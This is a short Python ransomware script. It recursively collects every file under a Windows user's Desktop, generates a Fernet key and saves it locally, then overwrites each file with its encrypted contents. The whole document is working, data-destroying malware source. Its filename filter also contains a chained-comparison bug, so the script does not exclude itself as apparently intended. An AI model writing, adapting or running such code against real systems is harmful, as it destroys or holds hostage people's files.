import os
from cryptography.fernet import Fernet

files = []

root_path = 'C:\\Users\\deneme\\Desktop'

for foldername, subfolders, filenames in os.walk(root_path):
    for filename in filenames:
        if filename != "desktop.ini" != "ransom.py" and filename != "generatedkey.key" and filename != "ransomdecrypter.py":
            file_path = os.path.join(foldername, filename)
            files.append(file_path)

key = Fernet.generate_key()

with open("generatedkey.key","wb") as generatedkey:
    generatedkey.write(key)

for file in files:
    with open(file, "rb") as f:
        contents = f.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as f:
        f.write(contents_encrypted)
